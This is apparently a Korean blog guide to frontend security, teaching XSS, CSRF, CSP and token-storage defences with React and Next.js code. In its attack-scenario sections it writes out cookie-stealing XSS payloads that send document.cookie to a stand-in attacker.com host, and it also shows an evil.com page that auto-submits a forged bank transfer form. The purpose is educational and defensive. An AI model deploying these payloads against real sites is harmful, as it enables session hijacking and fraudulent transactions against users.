---
title: "프론트엔드 보안 완벽 가이드 - XSS, CSRF 방어하기"
description: 프론트엔드 보안의 모든 것을 다룹니다. XSS, CSRF 공격 원리부터 실전 방어 전략까지. React의 보안 메커니즘, DOMPurify 활용, CSP 설정, 안전한 토큰 관리를 실제 공격 시나리오와 방어 코드로 완벽하게 설명합니다. OWASP 기반 실무 체크리스트 포함.
author: changsu
date: 2025-11-16 14:00:00 +0900
categories: [Frontend, Security]
tags: [security, xss, csrf, frontend-security, web-security, react-security, sanitization, csp, 보안, 프론트엔드보안]
toc: true
comments: true
---

## 들어가며

"우리 서비스는 백엔드에서 보안을 다 처리하니까 프론트엔드는 괜찮아요." 이런 생각, 위험합니다.

2024년 OWASP Top 10에 따르면, **웹 애플리케이션 공격의 상당수가 프론트엔드 취약점을 통해 발생**합니다. XSS(Cross-Site Scripting)는 여전히 가장 흔한 공격이며, CSRF(Cross-Site Request Forgery)는 인증된 사용자를 대상으로 치명적인 피해를 줄 수 있습니다.

실제로 2023년 주요 기업들의 보안 사고 중 많은 수가 프론트엔드 보안 취약점에서 시작되었습니다. 사용자의 세션을 탈취당하고, 개인정보가 유출되며, 악성 스크립트가 실행되는 일이 여전히 발생하고 있습니다.

이 글에서는 프론트엔드 개발자가 반드시 알아야 할 보안 지식을 실전 코드와 함께 다룹니다. 공격이 어떻게 이루어지는지 이해하고, 어떻게 방어해야 하는지 실습할 수 있습니다.

> 프론트엔드 보안은 선택이 아닌 필수입니다. 사용자를 보호하는 것이 개발자의 책임입니다.
{: .prompt-warning }

## OWASP Top 10과 프론트엔드

### OWASP Top 10 (2021) 프론트엔드 관련 항목

OWASP(Open Web Application Security Project)는 웹 보안의 가장 중요한 위협을 정리한 Top 10 리스트를 제공합니다.

**프론트엔드와 직접 관련된 항목:**

| 순위 | 위협 | 설명 | 프론트엔드 영향 |
|------|------|------|----------------|
| **A03** | Injection | SQL, NoSQL, XSS 등 삽입 공격 | XSS가 가장 흔함 |
| **A05** | Security Misconfiguration | 잘못된 보안 설정 | CORS, CSP 설정 오류 |
| **A07** | Identification and Authentication Failures | 인증/인가 실패 | 토큰 관리, 세션 관리 |
| **A08** | Software and Data Integrity Failures | 무결성 검증 실패 | CDN, 써드파티 스크립트 |

### 실제 피해 사례

**사례 1: British Airways (2018)**
- 공격 방법: 제3자 스크립트 삽입 (XSS)
- 피해: 38만 명의 고객 카드 정보 유출
- 벌금: 2,300만 달러

**사례 2: Magecart 공격 (2019-2020)**
- 공격 방법: 이커머스 사이트 결제 페이지에 악성 JavaScript 주입
- 피해: 수백 개 사이트에서 카드 정보 탈취

**사례 3: GitHub (2018)**
- 공격 방법: OAuth 취약점 + CSRF
- 피해: 써드파티 앱을 통한 비인가 접근

이러한 사고들의 공통점은 **프론트엔드 보안 취약점에서 시작**되었다는 것입니다.

## XSS (Cross-Site Scripting) 완벽 가이드

### XSS란?

XSS는 공격자가 웹 페이지에 악성 스크립트를 삽입하여 다른 사용자의 브라우저에서 실행되게 하는 공격입니다.

### XSS의 3가지 유형

#### 1. Stored XSS (저장형 XSS)

가장 위험한 유형입니다. 악성 스크립트가 서버에 저장되어 모든 사용자에게 영향을 줍니다.

```javascript
// ❌ 취약한 코드 예시
// 사용자가 작성한 댓글을 그대로 렌더링
function CommentList({ comments }) {
  return (
    <div>
      {comments.map(comment => (
        <div key={comment.id}>
          <p>{comment.author}</p>
          {/* 위험! HTML이 그대로 실행됨 */}
          <div dangerouslySetInnerHTML={{ __html: comment.text }} />
        </div>
      ))}
    </div>
  );
}
```

**공격 시나리오:**

```javascript
// 공격자가 댓글에 다음을 입력:
const maliciousComment = `
  안녕하세요!
  <script>
    // 쿠키 탈취
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: document.cookie
    });
  </script>
`;

// 또는 더 교묘하게:
const maliciousComment2 = `
  <img src="x" onerror="
    fetch('https://attacker.com/steal?cookie=' + document.cookie)
  " />
`;
```

이 댓글을 본 모든 사용자의 쿠키(세션 토큰 포함)가 공격자에게 전송됩니다.

#### 2. Reflected XSS (반사형 XSS)

URL 파라미터나 폼 입력이 즉시 반사되어 표시되는 경우 발생합니다.

```jsx
// ❌ 취약한 코드
function SearchResults() {
  const searchParams = new URLSearchParams(window.location.search);
  const query = searchParams.get('q');

  return (
    <div>
      <h1>검색 결과</h1>
      {/* 위험! URL 파라미터가 그대로 렌더링 */}
      <p>검색어: <span dangerouslySetInnerHTML={{ __html: query }} /></p>
    </div>
  );
}
```

**공격 시나리오:**

```
https://example.com/search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

// 또는 인코딩하여:
https://example.com/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

공격자가 이 링크를 피싱 이메일로 보내면, 클릭한 사용자의 쿠키가 탈취됩니다.

#### 3. DOM-based XSS (DOM 기반 XSS)

서버를 거치지 않고 클라이언트 측에서만 발생하는 XSS입니다.

```javascript
// ❌ 위험한 코드
function DisplayUserInput() {
  const hash = window.location.hash.substring(1);

  // 위험! location.hash를 직접 DOM에 삽입
  document.getElementById('output').innerHTML = hash;
}
```

**공격 시나리오:**

```
https://example.com/profile#<img src=x onerror="alert(document.cookie)">
```

### React의 기본 XSS 방어

React는 기본적으로 XSS를 방어합니다:

```jsx
// ✅ 안전한 코드
function SafeComponent({ userInput }) {
  // React가 자동으로 이스케이프 처리
  return <div>{userInput}</div>;
}

// userInput = "<script>alert('XSS')</script>"
// 실제 렌더링: &lt;script&gt;alert('XSS')&lt;/script&gt;
```

**React가 방어하는 방법:**

```javascript
// React 내부 동작 (단순화)
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };

  return text.replace(/[&<>"'\/]/g, (char) => map[char]);
}
```

### dangerouslySetInnerHTML 안전하게 사용하기

때로는 HTML을 렌더링해야 할 때가 있습니다 (마크다운, 리치 에디터 등). 이때 반드시 sanitization이 필요합니다.

#### DOMPurify 사용하기

```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

```typescript
// lib/sanitize.ts
import DOMPurify from 'dompurify';

/**
 * HTML 문자열을 안전하게 정제합니다
 */
export function sanitizeHtml(dirty: string): string {
  // 기본 설정으로 정제
  return DOMPurify.sanitize(dirty);
}

/**
 * 더 엄격한 정제 (링크와 기본 포맷만 허용)
 */
export function sanitizeHtmlStrict(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'title', 'target'],
    ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
  });
}

/**
 * 마크다운 렌더링 결과를 정제
 */
export function sanitizeMarkdown(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: [
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'p', 'br', 'span', 'div',
      'a', 'img',
      'ul', 'ol', 'li',
      'blockquote', 'code', 'pre',
      'strong', 'em', 'u', 's',
      'table', 'thead', 'tbody', 'tr', 'th', 'td',
    ],
    ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class', 'target', 'rel'],
    ALLOW_DATA_ATTR: false,
  });
}
```

```tsx
// components/SafeHtmlRenderer.tsx
import { sanitizeHtml } from '@/lib/sanitize';

interface SafeHtmlRendererProps {
  html: string;
  className?: string;
}

export function SafeHtmlRenderer({ html, className }: SafeHtmlRendererProps) {
  // ✅ 안전: DOMPurify로 정제 후 렌더링
  const cleanHtml = sanitizeHtml(html);

  return (
    <div
      className={className}
      dangerouslySetInnerHTML={{ __html: cleanHtml }}
    />
  );
}
```

**사용 예시:**

```tsx
// components/Comment.tsx
import { SafeHtmlRenderer } from './SafeHtmlRenderer';

interface CommentProps {
  comment: {
    id: string;
    author: string;
    text: string; // HTML 포함될 수 있음
    createdAt: string;
  };
}

export function Comment({ comment }: CommentProps) {
  return (
    <div className="comment">
      <div className="comment-author">{comment.author}</div>
      {/* ✅ 안전: 정제된 HTML만 렌더링 */}
      <SafeHtmlRenderer html={comment.text} className="comment-text" />
      <time>{comment.createdAt}</time>
    </div>
  );
}
```

**DOMPurify가 제거하는 것들:**

```typescript
// 테스트 예시
import DOMPurify from 'dompurify';

// 위험한 입력들
const dangerous = {
  script: '<script>alert("XSS")</script>',
  onerror: '<img src=x onerror="alert(\'XSS\')">',
  javascript: '<a href="javascript:alert(\'XSS\')">클릭</a>',
  iframe: '<iframe src="https://evil.com"></iframe>',
  object: '<object data="https://evil.com"></object>',
  embed: '<embed src="https://evil.com">',
};

Object.entries(dangerous).forEach(([key, value]) => {
  const clean = DOMPurify.sanitize(value);
  console.log(`${key}:`, clean);
});

// 결과:
// script: (빈 문자열)
// onerror: <img src="x">
// javascript: <a>클릭</a>
// iframe: (빈 문자열)
// object: (빈 문자열)
// embed: (빈 문자열)
```

### URL 파라미터 안전하게 다루기

```typescript
// ❌ 위험한 코드
function SearchPage() {
  const params = new URLSearchParams(window.location.search);
  const query = params.get('q');

  return <div dangerouslySetInnerHTML={{ __html: query }} />;
}

// ✅ 안전한 코드 1: 텍스트로만 렌더링
function SafeSearchPage() {
  const params = new URLSearchParams(window.location.search);
  const query = params.get('q') || '';

  return <div>{query}</div>; // React가 자동 이스케이프
}

// ✅ 안전한 코드 2: 추가 검증
function SaferSearchPage() {
  const params = new URLSearchParams(window.location.search);
  const query = params.get('q') || '';

  // 입력 검증
  const sanitizedQuery = query
    .trim()
    .replace(/[<>]/g, '') // 위험한 문자 제거
    .substring(0, 100); // 길이 제한

  return <div>{sanitizedQuery}</div>;
}
```

### href와 src 속성 검증

```typescript
// lib/url-validator.ts
/**
 * 안전한 URL인지 검증
 */
export function isSafeUrl(url: string): boolean {
  try {
    const parsed = new URL(url, window.location.origin);

    // javascript:, data:, vbscript: 등 위험한 프로토콜 차단
    const dangerousProtocols = ['javascript:', 'data:', 'vbscript:', 'file:'];

    return !dangerousProtocols.some(protocol =>
      parsed.protocol.toLowerCase().startsWith(protocol)
    );
  } catch {
    // URL 파싱 실패 시 안전하지 않다고 판단
    return false;
  }
}

/**
 * URL을 안전하게 정제
 */
export function sanitizeUrl(url: string): string {
  if (!url) return '#';

  if (isSafeUrl(url)) {
    return url;
  }

  // 위험한 URL은 # 으로 대체
  return '#';
}
```

```tsx
// components/SafeLink.tsx
import { sanitizeUrl } from '@/lib/url-validator';

interface SafeLinkProps {
  href: string;
  children: React.ReactNode;
  className?: string;
}

export function SafeLink({ href, children, className }: SafeLinkProps) {
  const safeHref = sanitizeUrl(href);

  return (
    <a
      href={safeHref}
      className={className}
      rel="noopener noreferrer" // 보안 강화
      target={safeHref.startsWith('http') ? '_blank' : undefined}
    >
      {children}
    </a>
  );
}
```

**위험한 URL 예시:**

```typescript
// 차단되어야 하는 위험한 URL들
const dangerousUrls = [
  'javascript:alert("XSS")',
  'data:text/html,<script>alert("XSS")</script>',
  'vbscript:msgbox("XSS")',
  'file:///etc/passwd',
];

dangerousUrls.forEach(url => {
  console.log(isSafeUrl(url)); // 모두 false
});

// 안전한 URL들
const safeUrls = [
  'https://example.com',
  'http://example.com',
  '/relative/path',
  'mailto:user@example.com',
  'tel:+1234567890',
];

safeUrls.forEach(url => {
  console.log(isSafeUrl(url)); // 모두 true
});
```

### XSS 방어 체크리스트

```tsx
// XSS 방어 체크리스트 컴포넌트
function XSSPreventionChecklist() {
  return (
    <div>
      <h3>✅ XSS 방어 체크리스트</h3>

      <section>
        <h4>1. 입력 처리</h4>
        <ul>
          <li>✅ 사용자 입력을 절대 신뢰하지 않기</li>
          <li>✅ HTML 렌더링 시 React 기본 방식 사용 (자동 이스케이프)</li>
          <li>✅ dangerouslySetInnerHTML 사용 최소화</li>
          <li>✅ 불가피한 경우 DOMPurify로 정제</li>
        </ul>
      </section>

      <section>
        <h4>2. URL 처리</h4>
        <ul>
          <li>✅ href, src 속성에 사용자 입력 삽입 전 검증</li>
          <li>✅ javascript:, data: 프로토콜 차단</li>
          <li>✅ URL 파라미터 렌더링 전 정제</li>
          <li>✅ 외부 링크에 rel="noopener noreferrer" 추가</li>
        </ul>
      </section>

      <section>
        <h4>3. 콘텐츠 보안</h4>
        <ul>
          <li>✅ Content Security Policy (CSP) 설정</li>
          <li>✅ 신뢰할 수 있는 도메인만 허용</li>
          <li>✅ 인라인 스크립트 사용 최소화</li>
          <li>✅ eval() 사용 금지</li>
        </ul>
      </section>
    </div>
  );
}
```

## CSRF (Cross-Site Request Forgery) 방어

### CSRF란?

CSRF는 사용자가 인증된 상태에서 공격자가 의도한 요청을 보내도록 유도하는 공격입니다.

### CSRF 공격 시나리오

```html
<!-- 공격자의 악성 사이트 (evil.com) -->
<!DOCTYPE html>
<html>
<body>
  <h1>무료 아이폰 이벤트!</h1>
  <p>버튼을 클릭하여 경품을 받으세요!</p>

  <!-- 실제로는 사용자 몰래 송금 요청 -->
  <form action="https://bank.com/transfer" method="POST" id="maliciousForm">
    <input type="hidden" name="to" value="attacker-account" />
    <input type="hidden" name="amount" value="1000000" />
  </form>

  <button onclick="document.getElementById('maliciousForm').submit()">
    경품 받기
  </button>

  <!-- 또는 자동으로 제출 -->
  <script>
    document.getElementById('maliciousForm').submit();
  </script>
</body>
</html>
```

**공격 과정:**

1. 사용자가 bank.com에 로그인 (쿠키/세션 생성)
2. 사용자가 evil.com 방문
3. evil.com의 폼이 자동으로 bank.com에 요청 전송
4. 브라우저가 자동으로 bank.com 쿠키를 포함시킴
5. bank.com은 정상 요청으로 인식하여 송금 처리

### CSRF Token 사용하기

```typescript
// lib/csrf.ts
/**
 * CSRF 토큰 생성
 */
export function generateCsrfToken(): string {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
}

/**
 * CSRF 토큰을 세션에 저장하고 반환
 */
export function setCsrfToken(): string {
  const token = generateCsrfToken();

  // sessionStorage에 저장 (클라이언트 측)
  if (typeof window !== 'undefined') {
    sessionStorage.setItem('csrf_token', token);
  }

  return token;
}

/**
 * CSRF 토큰 가져오기
 */
export function getCsrfToken(): string | null {
  if (typeof window === 'undefined') return null;
  return sessionStorage.getItem('csrf_token');
}
```

```tsx
// app/layout.tsx
'use client';

import { useEffect } from 'react';
import { setCsrfToken } from '@/lib/csrf';

export default function RootLayout({ children }) {
  useEffect(() => {
    // 앱 시작 시 CSRF 토큰 생성
    setCsrfToken();
  }, []);

  return (
    <html>
      <body>{children}</body>
    </html>
  );
}
```

```typescript
// lib/api.ts
import { getCsrfToken } from './csrf';

/**
 * CSRF 토큰을 포함한 안전한 fetch
 */
export async function safeFetch(url: string, options: RequestInit = {}) {
  const csrfToken = getCsrfToken();

  const headers = {
    ...options.headers,
    'X-CSRF-Token': csrfToken || '',
    'Content-Type': 'application/json',
  };

  return fetch(url, {
    ...options,
    headers,
    credentials: 'same-origin', // 쿠키 포함
  });
}
```

```tsx
// components/TransferForm.tsx
'use client';

import { safeFetch } from '@/lib/api';
import { useState } from 'react';

export function TransferForm() {
  const [recipient, setRecipient] = useState('');
  const [amount, setAmount] = useState('');
  const [status, setStatus] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    try {
      // ✅ CSRF 토큰이 자동으로 포함됨
      const response = await safeFetch('/api/transfer', {
        method: 'POST',
        body: JSON.stringify({ recipient, amount }),
      });

      if (response.ok) {
        setStatus('송금이 완료되었습니다.');
      } else {
        setStatus('송금에 실패했습니다.');
      }
    } catch (error) {
      setStatus('오류가 발생했습니다.');
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        type="text"
        value={recipient}
        onChange={(e) => setRecipient(e.target.value)}
        placeholder="받는 사람"
        required
      />
      <input
        type="number"
        value={amount}
        onChange={(e) => setAmount(e.target.value)}
        placeholder="금액"
        required
      />
      <button type="submit">송금</button>
      {status && <p>{status}</p>}
    </form>
  );
}
```

**서버 측 검증 (Next.js API Route):**

```typescript
// app/api/transfer/route.ts
import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  // CSRF 토큰 검증
  const csrfToken = request.headers.get('X-CSRF-Token');
  const sessionToken = request.cookies.get('session_token')?.value;

  // 세션에서 저장된 CSRF 토큰과 비교
  const storedCsrfToken = await getStoredCsrfToken(sessionToken);

  if (!csrfToken || csrfToken !== storedCsrfToken) {
    return NextResponse.json(
      { error: 'Invalid CSRF token' },
      { status: 403 }
    );
  }

  // 요청 처리
  const body = await request.json();
  // ... 송금 로직

  return NextResponse.json({ success: true });
}
```

### SameSite Cookie 속성

```typescript
// lib/cookies.ts
/**
 * 안전한 쿠키 설정
 */
export function setSecureCookie(
  name: string,
  value: string,
  options: {
    maxAge?: number;
    path?: string;
  } = {}
) {
  const cookieOptions = [
    `${name}=${value}`,
    'HttpOnly', // JavaScript 접근 차단
    'Secure', // HTTPS만 전송
    'SameSite=Strict', // CSRF 방어
    `Path=${options.path || '/'}`,
    options.maxAge && `Max-Age=${options.maxAge}`,
  ].filter(Boolean).join('; ');

  document.cookie = cookieOptions;
}
```

**SameSite 속성 비교:**

```typescript
// SameSite=Strict: 가장 엄격 (권장)
// - 다른 사이트에서 오는 모든 요청에 쿠키 미포함
// - CSRF 완벽 차단
// - 단점: 외부 링크 클릭 시 로그아웃 상태로 보임

// SameSite=Lax: 균형잡힌 설정
// - GET 요청에는 쿠키 포함
// - POST/PUT/DELETE는 쿠키 미포함
// - 대부분의 CSRF 차단하면서 사용성 유지

// SameSite=None: 모든 요청에 포함 (비권장)
// - Secure 속성 필수
// - CSRF 위험 높음
```

**Next.js에서 안전한 쿠키 설정:**

```typescript
// app/api/auth/login/route.ts
import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  // 인증 로직...
  const sessionToken = generateSessionToken();

  const response = NextResponse.json({ success: true });

  // ✅ 안전한 쿠키 설정
  response.cookies.set('session', sessionToken, {
    httpOnly: true,    // XSS 방어
    secure: true,      // HTTPS만
    sameSite: 'strict', // CSRF 방어
    maxAge: 60 * 60 * 24 * 7, // 7일
    path: '/',
  });

  return response;
}
```

### Double Submit Cookie 패턴

```typescript
// lib/double-submit.ts
/**
 * Double Submit Cookie 패턴
 * 쿠키와 요청 헤더에 같은 토큰을 넣어 검증
 */
export function setDoubleSubmitToken(): string {
  const token = generateRandomToken();

  // 1. HttpOnly가 아닌 쿠키에 저장 (JavaScript가 읽을 수 있어야 함)
  document.cookie = `csrf_token=${token}; SameSite=Strict; Secure; Path=/`;

  return token;
}

export function getDoubleSubmitToken(): string | null {
  const match = document.cookie.match(/csrf_token=([^;]+)/);
  return match ? match[1] : null;
}

export async function fetchWithDoubleSubmit(url: string, options: RequestInit = {}) {
  const token = getDoubleSubmitToken();

  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'X-CSRF-Token': token || '',
    },
    credentials: 'include',
  });
}
```

**서버 측 검증:**

```typescript
// app/api/protected/route.ts
import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  // 쿠키에서 토큰 추출
  const cookieToken = request.cookies.get('csrf_token')?.value;

  // 헤더에서 토큰 추출
  const headerToken = request.headers.get('X-CSRF-Token');

  // 두 토큰이 일치하는지 확인
  if (!cookieToken || !headerToken || cookieToken !== headerToken) {
    return NextResponse.json(
      { error: 'CSRF token mismatch' },
      { status: 403 }
    );
  }

  // 요청 처리
  return NextResponse.json({ success: true });
}
```

### CSRF 방어 체크리스트

```typescript
// CSRF 방어 체크리스트
const csrfDefenseChecklist = {
  essential: [
    '✅ 모든 상태 변경 요청에 CSRF 토큰 사용',
    '✅ GET 요청으로 상태 변경 금지',
    '✅ SameSite=Strict 또는 Lax 쿠키 사용',
    '✅ CORS 정책 올바르게 설정',
  ],

  recommended: [
    '✅ 민감한 작업에 재인증 요구 (비밀번호, 이메일 등)',
    '✅ Referer 헤더 검증 (추가 방어층)',
    '✅ 사용자 액션에 대한 명확한 확인 UI',
    '✅ 짧은 세션 타임아웃',
  ],

  advanced: [
    '✅ Double Submit Cookie 패턴',
    '✅ Custom Request Headers',
    '✅ Origin 헤더 검증',
    '✅ 중요 액션에 CAPTCHA 추가',
  ],
};
```

## Content Security Policy (CSP)

### CSP란?

CSP는 브라우저에게 어떤 소스에서 온 컨텐츠를 신뢰할지 알려주는 보안 정책입니다.

### CSP 설정하기 (Next.js)

```typescript
// next.config.ts
import type { NextConfig } from 'next';

const nextConfig: NextConfig = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",                           // 기본: 자신의 도메인만
              "script-src 'self' 'unsafe-inline' 'unsafe-eval'", // 스크립트
              "style-src 'self' 'unsafe-inline'",             // 스타일
              "img-src 'self' data: https:",                  // 이미지
              "font-src 'self' data:",                        // 폰트
              "connect-src 'self' https://api.example.com",   // API 호출
              "frame-ancestors 'none'",                       // iframe 삽입 방지
              "base-uri 'self'",                             // <base> 태그 제한
              "form-action 'self'",                          // 폼 제출 제한
            ].join('; '),
          },
        ],
      },
    ];
  },
};

export default nextConfig;
```

**더 엄격한 CSP (프로덕션 권장):**

```typescript
// next.config.ts
const strictCsp = [
  "default-src 'none'",                                    // 모든 것 차단 후 하나씩 허용
  "script-src 'self' https://trusted-cdn.com",            // 신뢰할 수 있는 CDN만
  "style-src 'self' https://trusted-cdn.com",
  "img-src 'self' https: data:",
  "font-src 'self' https://trusted-cdn.com",
  "connect-src 'self' https://api.example.com https://analytics.example.com",
  "frame-src 'none'",                                      // iframe 완전 차단
  "object-src 'none'",                                     // <object> 태그 차단
  "base-uri 'self'",
  "form-action 'self'",
  "upgrade-insecure-requests",                             // HTTP를 HTTPS로 업그레이드
].join('; ');
```

### CSP Nonce 사용하기

인라인 스크립트를 안전하게 사용하는 방법:

```typescript
// middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import { v4 as uuidv4 } from 'uuid';

export function middleware(request: NextRequest) {
  // 각 요청마다 고유한 nonce 생성
  const nonce = Buffer.from(uuidv4()).toString('base64');

  const csp = [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
    `style-src 'self' 'nonce-${nonce}'`,
    "object-src 'none'",
    "base-uri 'self'",
  ].join('; ');

  const response = NextResponse.next();

  response.headers.set('Content-Security-Policy', csp);
  response.headers.set('X-Nonce', nonce); // 커스텀 헤더로 nonce 전달

  return response;
}
```

```tsx
// app/layout.tsx
import { headers } from 'next/headers';

export default async function RootLayout({ children }) {
  const nonce = (await headers()).get('X-Nonce') || '';

  return (
    <html>
      <head>
        {/* nonce를 사용한 안전한 인라인 스크립트 */}
        <script nonce={nonce} dangerouslySetInnerHTML={{
          __html: `
            window.__INITIAL_DATA__ = ${JSON.stringify({ env: 'production' })};
          `
        }} />
      </head>
      <body>{children}</body>
    </html>
  );
}
```

### CSP 위반 리포팅

```typescript
// CSP 위반 보고 받기
const cspWithReporting = [
  // ... 기존 CSP 규칙들
  "report-uri https://example.com/csp-report",
  "report-to csp-endpoint",
].join('; ');

// 보고 엔드포인트 설정
const reportTo = JSON.stringify({
  group: 'csp-endpoint',
  max_age: 10886400,
  endpoints: [{ url: 'https://example.com/csp-report' }],
});
```

```typescript
// app/api/csp-report/route.ts
import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  const report = await request.json();

  console.error('CSP Violation:', {
    documentUri: report['csp-report']['document-uri'],
    violatedDirective: report['csp-report']['violated-directive'],
    blockedUri: report['csp-report']['blocked-uri'],
    sourceFile: report['csp-report']['source-file'],
    lineNumber: report['csp-report']['line-number'],
  });

  // 로깅 서비스로 전송
  // await sendToLoggingService(report);

  return NextResponse.json({ received: true });
}
```

## 안전한 인증/인가

### 토큰 저장 위치

```typescript
// 토큰 저장 방식 비교
const tokenStorageComparison = {
  localStorage: {
    pros: [
      '간단한 사용',
      '페이지 새로고침 후에도 유지',
      'CSRF 공격에 안전',
    ],
    cons: [
      'XSS 공격에 취약 ⚠️',
      'JavaScript로 접근 가능',
      '탭 간 공유됨',
    ],
    verdict: '❌ 권장하지 않음',
  },

  cookie: {
    pros: [
      'HttpOnly 플래그로 XSS 방어 ✅',
      'SameSite로 CSRF 방어 ✅',
      '자동으로 요청에 포함됨',
    ],
    cons: [
      'CSRF 공격 가능 (SameSite 없으면)',
      '크기 제한 (4KB)',
    ],
    verdict: '✅ 가장 권장 (HttpOnly + Secure + SameSite)',
  },

  memory: {
    pros: [
      'XSS 공격에 가장 안전 ✅',
      'CSRF 공격에 안전 ✅',
      '탭이 닫히면 자동 삭제',
    ],
    cons: [
      '페이지 새로고침 시 사라짐 ⚠️',
      '구현 복잡도 높음',
    ],
    verdict: '✅ 높은 보안이 필요한 경우',
  },
};
```

### 안전한 토큰 관리

```typescript
// lib/auth-token.ts
/**
 * 메모리에 토큰 저장 (가장 안전)
 */
class TokenStore {
  private static instance: TokenStore;
  private accessToken: string | null = null;
  private refreshToken: string | null = null;

  private constructor() {}

  static getInstance(): TokenStore {
    if (!TokenStore.instance) {
      TokenStore.instance = new TokenStore();
    }
    return TokenStore.instance;
  }

  setAccessToken(token: string): void {
    this.accessToken = token;
  }

  getAccessToken(): string | null {
    return this.accessToken;
  }

  setRefreshToken(token: string): void {
    this.refreshToken = token;
  }

  getRefreshToken(): string | null {
    return this.refreshToken;
  }

  clear(): void {
    this.accessToken = null;
    this.refreshToken = null;
  }
}

export const tokenStore = TokenStore.getInstance();
```

```typescript
// lib/auth.ts
import { tokenStore } from './auth-token';

/**
 * 로그인
 */
export async function login(email: string, password: string) {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
    credentials: 'include', // Refresh token은 HttpOnly 쿠키로
  });

  if (!response.ok) {
    throw new Error('Login failed');
  }

  const { accessToken } = await response.json();

  // Access token은 메모리에 저장
  tokenStore.setAccessToken(accessToken);

  return true;
}

/**
 * Access token 갱신
 */
export async function refreshAccessToken(): Promise<string | null> {
  try {
    const response = await fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include', // Refresh token 쿠키 포함
    });

    if (!response.ok) {
      throw new Error('Token refresh failed');
    }

    const { accessToken } = await response.json();
    tokenStore.setAccessToken(accessToken);

    return accessToken;
  } catch (error) {
    // Refresh 실패 시 로그아웃
    await logout();
    return null;
  }
}

/**
 * 인증된 요청 보내기
 */
export async function authenticatedFetch(url: string, options: RequestInit = {}) {
  let accessToken = tokenStore.getAccessToken();

  // Access token이 없으면 갱신 시도
  if (!accessToken) {
    accessToken = await refreshAccessToken();
    if (!accessToken) {
      throw new Error('Not authenticated');
    }
  }

  let response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${accessToken}`,
    },
  });

  // 401 에러 시 토큰 갱신 후 재시도
  if (response.status === 401) {
    accessToken = await refreshAccessToken();

    if (accessToken) {
      response = await fetch(url, {
        ...options,
        headers: {
          ...options.headers,
          'Authorization': `Bearer ${accessToken}`,
        },
      });
    }
  }

  return response;
}

/**
 * 로그아웃
 */
export async function logout() {
  tokenStore.clear();

  await fetch('/api/auth/logout', {
    method: 'POST',
    credentials: 'include',
  });

  window.location.href = '/login';
}
```

### Refresh Token 전략

```typescript
// app/api/auth/login/route.ts
import { NextResponse } from 'next/server';
import { sign } from 'jsonwebtoken';

const ACCESS_TOKEN_EXPIRY = '15m';  // 15분 (짧게)
const REFRESH_TOKEN_EXPIRY = '7d';  // 7일 (길게)

export async function POST(request: Request) {
  const { email, password } = await request.json();

  // 사용자 인증...
  const user = await authenticateUser(email, password);

  if (!user) {
    return NextResponse.json(
      { error: 'Invalid credentials' },
      { status: 401 }
    );
  }

  // Access Token 생성 (짧은 만료 시간)
  const accessToken = sign(
    { userId: user.id, email: user.email },
    process.env.JWT_SECRET!,
    { expiresIn: ACCESS_TOKEN_EXPIRY }
  );

  // Refresh Token 생성 (긴 만료 시간)
  const refreshToken = sign(
    { userId: user.id, type: 'refresh' },
    process.env.REFRESH_TOKEN_SECRET!,
    { expiresIn: REFRESH_TOKEN_EXPIRY }
  );

  // Refresh Token은 DB에 저장
  await saveRefreshToken(user.id, refreshToken);

  const response = NextResponse.json({
    accessToken,
    user: { id: user.id, email: user.email },
  });

  // Refresh Token은 HttpOnly 쿠키로
  response.cookies.set('refresh_token', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 60 * 60 * 24 * 7, // 7일
    path: '/api/auth/refresh', // refresh 엔드포인트에서만 사용
  });

  return response;
}
```

```typescript
// app/api/auth/refresh/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { verify, sign } from 'jsonwebtoken';

export async function POST(request: NextRequest) {
  const refreshToken = request.cookies.get('refresh_token')?.value;

  if (!refreshToken) {
    return NextResponse.json(
      { error: 'No refresh token' },
      { status: 401 }
    );
  }

  try {
    // Refresh Token 검증
    const decoded = verify(
      refreshToken,
      process.env.REFRESH_TOKEN_SECRET!
    ) as { userId: string };

    // DB에 저장된 토큰과 비교
    const isValid = await verifyRefreshToken(decoded.userId, refreshToken);

    if (!isValid) {
      throw new Error('Invalid refresh token');
    }

    // 새 Access Token 생성
    const accessToken = sign(
      { userId: decoded.userId },
      process.env.JWT_SECRET!,
      { expiresIn: '15m' }
    );

    return NextResponse.json({ accessToken });
  } catch (error) {
    // Refresh Token이 유효하지 않으면 쿠키 삭제
    const response = NextResponse.json(
      { error: 'Invalid refresh token' },
      { status: 401 }
    );

    response.cookies.delete('refresh_token');

    return response;
  }
}
```

